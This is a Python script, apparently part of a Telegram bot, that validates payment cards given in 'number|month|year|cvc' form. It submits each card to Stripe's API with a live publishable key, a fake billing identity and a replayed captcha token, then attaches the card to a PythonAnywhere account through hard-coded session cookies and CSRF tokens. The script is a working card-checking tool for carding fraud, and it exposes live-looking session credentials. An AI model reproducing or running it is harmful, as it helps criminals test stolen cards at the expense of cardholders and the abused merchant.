import requests
import user_agent
iioo = 'No Dairect Off Bot'
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#ebrahim
		yy = yy.split("20")[1]
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}

	data = f'type=card&billing_details[name]=Angel+Rippin&billing_details[address][line1]=1120+Stafford+Rd&billing_details[address][city]=Plainfield&billing_details[address][postal_code]=46168&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=fb83f278-a5da-4c63-af1a-c3e75f74a5579320a4&muid=0c1135d0-2a0a-4610-aa1f-aeab0bb33b76986d9f&sid=983d22c8-9518-487b-a7b5-b1da17a892f6aec682&payment_user_agent=stripe.js%2Ff1a1ce5342%3B+stripe-js-v3%2Ff1a1ce5342%3B+split-card-element&referrer=https%3A%2F%2Fwww.pythonanywhere.com&time_on_page=78734&key=pk_live_ECdoUHKMCDhZOSh2bJLLfBGa&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYl9OQML5DFEW3TNuaTnKqxadpzAw0iuS9ohiHCbQ8LmslmtiC9qhP2QixQxYXNwUY_lIamC_KioADxmiGEgEmLmCVjtmuCx_cb9wn5hHrLlD0RecEHWM6zS1ZXvPdjf4NG-KVCYhlm5lemkar4xsjWawlTC0OJX1CtpWH_aYlUCnST_P3PzjbJeILPJ84lZOH8jc6SzKEgRiovNFOeYbo9s5TyeHLCUzJ8ySwGGyVqMt08I_IVlKoB9toZJfHuSLI3BoLih2IKdSokUBAMB6N_cOUO-D5WquoFx0vCApT7t2IDhZXrIZe9W-wxyqoi_CrqD-RBO6zZLmAus79gEzsXk-hU0pPk-t93t5qiMmY4IHYr4Aid2LbI4-al4i6tDEOmAa4f86gDZUlt4mydX5_JlQTlBA200MyGu3zehQzcJI9rES5DEYk3q4IlTcTD0Fktd271OJoaAEHKPg6VRQ2dmF0DAx4Dpjexv3FjR71EsWiHaPll8pjf9MOI3-Bvb2sOricY4aVRxk76P-LonrsGy48gAQJbbLzkBROg7HUTh9P5gSLhyKh5106fsgB0zm76GRPeF551E7C6juD7nWyGlNpndk-HgQbpZCRZaIYbteEn5wQU78tIvaEW_M72dei6L5C-5295lbRqHKZHiemXPQCzi-iCLdjid6llWMhofn6U_vjWI_9ZTSHSezdrtprdzzqNdgCRdyAUzYQbme2SFiPPwVrO7z-YvJ9zutW7ATX27TptJY4Oxoz7rDBVKq28ohRTp-EX1uuw3LRXlMAwRgZOEUYq0PpmpJX3eY9yZ6UfF4UfR_QziHQrZCaZBaJqvIR00n6G0jtf3So_RVxwaszfQNddJazoaa13V8AurzIJgsU4qq5wMiHt7uoxJGrG1iEzseK7TpE_3b46cgcp2GN3_-qK9lGgS312UP1T5DmG2WZ6iFCI65g6puvaAyEJYnQ5MvcC7tvxH_6o-iy6BhoRkGqf3g6LHoFQHclWNWnVxOtRhiaWGpOYVtHmx3-b3GU3dvRDCHKI9n4pT5R9Z6wgJx86L0m2xh54WsQ2IxVqYgCywg8slRP20CTqvOoptRjjneTFAOYglPSKOkhdZg0nA9zGT-UgsqFhr7RBS2K0CxrHre79Fwq7HRMeDN5VQHTRz6aTHBgDZKDIayLDoMtYX92rjF3LJYmKMiObBcVuAd5zahO2F-6jQiODMvvJoRaQLJ7gvs2CMbStIEUrhmENGVZ1gtgGy8Xr3Iba3tdUKyAAK8Y5fHMTgNWTRo72MHRalwdg_ylrkq-EfICXycLScirAzkLPmMYMpVVE_BBtcXSNMGMb_eqZxS47sOEGDq35ph91kgj44cckJBf8wYKvl9IRHWpoI8O2CXFpinKccp23sEj-HWCrVR8ECBCLQsHwjCiBFc_vnlEpHCH-cO1J0dr59RFPqJnRv_qa0qC9kd5eGBoy-X8pZrVa0LaR-hy3_BIV74_-i2VIDAIHUh23CNBEgx3FGEVt6pgM84gYEK_DeEPd-6zv8XHyLxwXo29oWnE2p8BGG26rbm15cBvcntFdY0M0pYAI4gV2ejc19L0LOxr28w-vM81GC4yts45Ub_V8Lz2XE15hJIFKseoOwB03Je42O2noKK_pIKCVbqFMu9SuYVJPlvrUJwN-F8qQyfG5k3oKWKBcSfeRoZSP6jjjJWA6g_YbvP1fHR5c6p63mgkncyuN-nUWYMPxeCu6pMWdaapHY0ik5I0OKO10Qh_IOs3JhuOXMoLYnb7faMVA_Udaoyq8n_Fjd90MsotUHXEjePfmxSsMIPsEY3Ee3J4UrGV7wuY1Muec9dMkKGn-XeJ77fT93wqvqUzV0nseNrScvKZuWFLlKpCzaKr1gQXQ1z9lFPdrN91YGTN61wFd-s7laGgCCfnez16lLc2panfatM0jFQ2EqPbjQ4A98I6HrNIOhPwNOLxsuLY5qWL4XE5Y4JzJbluXSHp8uj4MfvCIKlaR3_0uDvDWXCb-muNRNlDBdTAouV2LeowUK80hjeIf0nWVQkMKC_iOwOXwoDsLoRHrxA8okBEcG6GSd1kt7J_DNB_H1uFX4IbV8QjxkKNleHDOZj6Q3qhzaGFyZF9pZM4DMYNvomtypzQ5ZmU0ZmaicGQA.i_wtvHcoKH3elZaMtYUDCzmaSJ-bSxe345JnKGEZGIc'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	try:	
		iid = (response.json()['id'])
	except:
		print('	no id ')
		

	cookies = {
    'cookie_warning_seen': 'True',
    '_ga': 'GA1.1.1990081147.1712979855',
    '__stripe_mid': '0c1135d0-2a0a-4610-aa1f-aeab0bb33b76986d9f',
    'csrftoken': 'lLX0L9lMt0zYJ5utW58QkLBupVDfS67BbeLcabm1KwDdGsrgXf2l6OQWjzUDQGEb',
    'sessionid': 'ahycmhqohcxe5gylly4d0gf26blgr2a1',
    '_ga_DHJF51F24N': 'GS1.1.1715376212.9.1.1715376219.0.0.0',
    '__stripe_sid': '983d22c8-9518-487b-a7b5-b1da17a892f6aec682',
}

	headers = {
    'Accept': 'application/json',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://www.pythonanywhere.com',
    'Referer': 'https://www.pythonanywhere.com/user/gvvvv727/account/stripe_enter_card_data',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'X-CSRFToken': 'u5KxiEFAONkTnd4PRRBZfiMvBPa31TuGkyyJHGGP5jo8kA1CS1vu1l1XvtrrZt1g',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

	json_data = {
    'payment_method_id': iid,
}

	response = requests.post(
    'https://www.pythonanywhere.com/user/gvvvv727/account/stripe_save_payment_details',
    cookies=cookies,
    headers=headers,
    json=json_data,
)

	try:
		ii=(response.text)
	except:
		return 'error'
	return ii

	
